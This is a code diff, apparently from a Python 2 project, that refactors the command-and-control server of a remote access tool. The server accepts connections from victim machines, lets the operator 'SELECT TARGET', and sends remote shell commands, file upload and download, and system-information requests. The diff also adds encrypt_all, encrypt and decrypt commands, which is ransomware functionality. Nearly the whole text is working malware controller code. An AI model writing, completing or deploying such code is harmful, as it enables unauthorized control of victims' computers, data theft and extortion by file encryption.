@@ -133,6 +133,7 @@ class MC:
 
 	socks = []
 	clients = []
+	choice = None
 
 
 	# constructor
@@ -153,36 +154,6 @@ class MC:
 		cls.start()
 
 
-	# sent data to socket
-	def sendTo(cls, csock, sig):
-		csock.sendall(sig)
-
-	# receive data from socket
-	def receiveFrom(cls, csock):
-		data = ""
-		pkt = csock.recv(cls.BUFFER)
-		while(pkt):
-			data =  data + pkt
-			if(data != ""):
-				break
-			else:
-				d = csock.recv(cls.BUFFER)
-		return data
-
-	# clean screen
-	def clean(cls):
-		cls.plat = platform.platform()
-		if(cls.plat.startswith("lin") or cls.plat.startswith("Lin")):
-			lin = lambda: os.system("clear")
-			return lin()
-		elif(cls.plat.startswith("win") or cls.plat.startswith("Win") ):
-			win = lambda: os.system("cls")
-			return win()
-		else:
-			drw = lambda: os.system("clear")
-			return drw()
-
-
 	# bind host & port
 	def bind_and_listen(cls):
 		try:
@@ -193,11 +164,51 @@ class MC:
 			pass
 
 
-	# close and remove connections from socks & clients
-	def close_remote(cls, sock):
-		sock.close()
-		time.sleep(cls.INTERVAL)
-
+	# We Start Here :)
+	def start(cls):
+		while True:
+			cls.refresh()
+			try:
+				try:
+					cls.wait(cls.LONG_INTERVAL)
+					sock, addr =  cls.accept()
+				except socket.timeout:
+					continue
+				if(sock):
+					sock.settimeout(None)
+					cls.socks.append(sock)
+					cls.clients.append(addr)
+				cls.refresh()
+				time.sleep(cls.INTERVAL)
+			except KeyboardInterrupt:
+				cls.refresh()
+				try:
+					cls.choice = input("\nSELECT TARGET: ")
+					if(cls.choice == 0):
+						print "\nExiting...\n"
+						for n in range(0,len(cls.socks)):
+							cls.socks[n].close()
+						sys.exit()
+					elif(isinstance(cls.choice, str)):
+						print "Invalid input"
+					cls.choice -= 1
+					cls.clean()                                                                     
+					print "[!] Activating target {}".format(str(cls.clients[cls.choice]))
+					cls.FLAG = True
+					cls.sendTo(cls.socks[cls.choice], cls.SIG)
+				except IndexError:
+					print "Invaid Selection!"
+					time.sleep(cls.INTERVAL)
+			while(cls.FLAG):
+				try:
+					data = cls.receiveFrom(cls.socks[cls.choice])
+					data.lower()
+				# disconnection from target side
+				except:
+					cls.client_disconnect(cls.choice)
+					break
+				cls.data_handler(data)
+	
 
 	# refresh connections
 	def refresh(cls):
@@ -225,6 +236,34 @@ class MC:
 		return cls._sock.accept()
 
 
+	# clean screen
+	def clean(cls):
+		cls.plat = platform.platform()
+		if(cls.plat.startswith("lin") or cls.plat.startswith("Lin")):
+			lin = lambda: os.system("clear")
+			return lin()
+		elif(cls.plat.startswith("win") or cls.plat.startswith("Win") ):
+			win = lambda: os.system("cls")
+			return win()
+		else:
+			drw = lambda: os.system("clear")
+			return drw()
+
+
+	# receive data from socket
+	def receiveFrom(cls, csock):
+		data = ""
+		pkt = csock.recv(cls.BUFFER)
+		while(pkt):
+			data =  data + pkt
+			if(data != ""):
+				break
+			else:
+				d = csock.recv(cls.BUFFER)
+		return data
+
+	
+	# force disconnect on specific client
 	def client_disconnect(cls, choice):
 		print "\nClient disconnected... {}".format(str(cls.clients[choice]))
 		cls.close_remote(cls.socks[choice])
@@ -232,6 +271,58 @@ class MC:
 		cls.clients.remove(cls.clients[choice])
 		cls.refresh()
 		cls.FLAG = False
+
+
+	# handles the data
+	def data_handler(cls, data):			
+		#	quit -> quit the remote host connection
+		if('quit' in data):
+			cls.close_remote(cls.socks[cls.choice])
+			cls.socks.remove(cls.socks[cls.choice])
+			cls.clients.remove(cls.clients[cls.choice])
+			cls.refresh()
+			cls.FLAG = False
+			#break
+		elif(data != ''):
+			sys.stdout.write(data)
+			nextCmd = raw_input()
+		#	download -> download a file from remote host
+		if(nextCmd.startswith("download ")):
+			if(len(nextCmd.split(' ')) > 2):
+				cls.download(cls.socks[cls.choice], nextCmd.split(' ')[1], nextCmd.split(' ')[2])
+			else:
+				cls.download(cls.socks[cls.choice], nextCmd.split(' ')[1])
+		#	upload -> upload a file to remote host
+		elif(nextCmd.startswith("upload ")):
+			if(len(nextCmd.split(' ')) > 2):
+				cls.upload(cls.socks[cls.choice], nextCmd.split(' ')[1], nextCmd.split(' ')[2])
+			else:
+				cls.upload(cls.socks[cls.choice], nextCmd.split(' ')[1])
+		# get mashine info
+		elif(nextCmd.startswith('sys_info')):
+			cls.sendTo(cls.socks[cls.choice], nextCmd)
+		# encrypt add data
+		elif(nextCmd.startswith('encrypt_all')):
+			cls.sendTo(cls.socks[cls.choice], nextCmd)
+		# encrypt single file
+		elif(nextCmd.startswith('encrypt')):
+			cls.sendTo(cls.socks[cls.choice], nextCmd)
+		# decrypt all data
+		elif(nextCmd.startswith('decrypt_all')):
+			cls.sendTo(cls.socks[cls.choice], nextCmd)
+		# decrypt single file
+		elif(nextCmd.startswith('decrypt')):
+			cls.sendTo(cls.socks[cls.choice], nextCmd)
+		#	any oter strings / commands
+		elif(nextCmd != ''):
+			cls.sendTo(cls.socks[cls.choice], nextCmd)
+
+
+	# close and remove connections from socks & clients
+	def close_remote(cls, sock):
+		sock.close()
+		time.sleep(cls.INTERVAL)
+
 
 	# download file from remote host
 	def download(cls, sock, rf, lf=None):
@@ -280,90 +371,13 @@ class MC:
 		time.sleep(cls.INTERVAL)
 
 
+	# sent data to socket
+	def sendTo(cls, csock, sig):
+		csock.sendall(sig)
 
 
 ################################
-	# We Start Here :)
-	def start(cls):
-		while True:
-			cls.refresh()
-			try:
-				
-				try:
-					cls.wait(cls.LONG_INTERVAL)
-					sock, addr =  cls.accept()
-				except socket.timeout:
-					continue
-				
-				if(sock):
-					sock.settimeout(None)
-					cls.socks.append(sock)
-					cls.clients.append(addr)
-				cls.refresh()
-				time.sleep(cls.INTERVAL)
-			
-			except KeyboardInterrupt:
-				cls.refresh()
-				try:
-					choice = input("\nSELECT TARGET: ")
-
-					if(choice == 0):
-						print "\nExiting...\n"
-						for n in range(0,len(cls.socks)):
-							cls.socks[n].close()
-						sys.exit()
-					elif(isinstance(choice, str)):
-						print "Invalid input"
-
-					choice -= 1
-					cls.clean()                                                                     
-					print "[!] Activating target {}".format(str(cls.clients[choice]))
-					cls.FLAG = True
-					cls.sendTo(cls.socks[choice], cls.SIG)
-				except IndexError:
-					print "Invaid Selection!"
-					time.sleep(cls.INTERVAL)
-
-			while(cls.FLAG):
-				try:
-					data = cls.receiveFrom(cls.socks[choice])
-				# disconnection from target side
-				except:
-					cls.client_disconnect(choice)
-					break
-					
-				#	quit -> quit the remote host connection
-				if('quit' in data):
-					cls.close_remote(cls.socks[choice])
-					cls.socks.remove(cls.socks[choice])
-					cls.clients.remove(cls.clients[choice])
-					cls.refresh()
-					cls.FLAG = False
-					break
-				elif(data != ''):
-					sys.stdout.write(data)
-					nextCmd = raw_input()
-				
-				#	download -> download a file from remote host
-				if(nextCmd.startswith("download ")):
-					if(len(nextCmd.split(' ')) > 2):
-						cls.download(cls.socks[choice], nextCmd.split(' ')[1], nextCmd.split(' ')[2])
-					else:
-						cls.download(cls.socks[choice], nextCmd.split(' ')[1])
-				
-				#	upload -> upload a file to remote host
-				elif(nextCmd.startswith("upload ")):
-					if(len(nextCmd.split(' ')) > 2):
-						cls.download(cls.socks[choice], nextCmd.split(' ')[1], nextCmd.split(' ')[2])
-					else:
-						cls.download(cls.socks[choice], nextCmd.split(' ')[1])
-				# get mashine info
-				elif(nextCmd.startswith('sys_info')):
-					cls.sendTo(cls.socks[choice], nextCmd)
-
-				#	any oter strings / commands
-				elif(nextCmd != ''):
-					cls.sendTo(cls.socks[choice], nextCmd)
+	
 
 
 
